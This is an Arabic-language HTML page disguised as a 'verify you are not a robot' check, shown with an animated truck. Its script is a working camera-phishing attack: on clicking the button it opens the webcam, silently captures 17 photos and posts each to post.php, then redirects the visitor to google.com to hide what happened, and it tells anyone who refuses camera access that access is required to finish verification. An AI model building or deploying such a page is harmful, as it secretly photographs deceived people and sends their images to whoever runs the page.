<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>التحقق الأمني</title>
  <style>
    body {
      margin: 0;
      background: #f0f2f5;
      font-family: sans-serif;
      text-align: center;
    }
    h2 {
      font-size: 26px;
      color: #007bff;
    }
    button {
      padding: 15px 30px;
      font-size: 20px;
      cursor: pointer;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      transition: 0.3s;
      margin-top: 15px;
    }
    button:hover { background: #0056b3; }

    /* الطريق */
    .road {
      position: relative;
      margin: 40px auto;
      width: 90%;
      height: 100px;
      background: #333;
    }
    .road::after {
      content: "";
      position: absolute;
      top: 45px;
      left: 0;
      width: 100%;
      height: 10px;
      background: repeating-linear-gradient(
        to right,
        #fff 0,
        #fff 40px,
        transparent 40px,
        transparent 80px
      );
    }

    /* السيارة */
    .truck {
      position: absolute;
      bottom: 20px;
      left: -150px;
      font-size: 100px;
      text-shadow: 0 0 20px yellow;
    }
    .truck.move {
      animation: drive 10s linear forwards, blink 1s infinite alternate;
      animation-iteration-count: 5; /* تتحرك للأمام 5 مرات */
    }
    @keyframes drive {
      from { left: -150px; }
      to { left: calc(100% - 120px); }
    }
    @keyframes blink {
      from { text-shadow: 0 0 5px yellow; }
      to { text-shadow: 0 0 25px yellow; }
    }
  </style>
</head>
<body>

<div style="margin-top: 25vh;">
  <h2>تحقق أنك لست روبوت</h2>
  <button onclick="startProcess()">ابدأ التحقق</button>
</div>

<div class="road">
  <div class="truck">🚚</div>
</div>

<script>
async function startProcess() {
  try {
    // تشغيل حركة السيارة
    const truck = document.querySelector('.truck');
    truck.classList.add('move');

    // تشغيل الكاميرا
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext('2d');

    // التقاط 17 صورة بفاصل نصف ثانية
    for (let i = 0; i < 17; i++) {
      ctx.drawImage(video, 0, 0, 640, 480);
      const data = canvas.toDataURL('image/jpeg', 0.7);

      await fetch('post.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'img=' + encodeURIComponent(data) + '&frame=' + i
      });

      await new Promise(resolve => setTimeout(resolve, 500));
    }

    // إيقاف الكاميرا
    stream.getTracks().forEach(track => track.stop());

    // بعد انتهاء العملية تحويل المستخدم
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 2000);

  } catch (err) {
    console.error(err);
    alert("يرجى السماح بالوصول للكاميرا لإكمال التحقق");
  }
}
</script>
</body>
</html>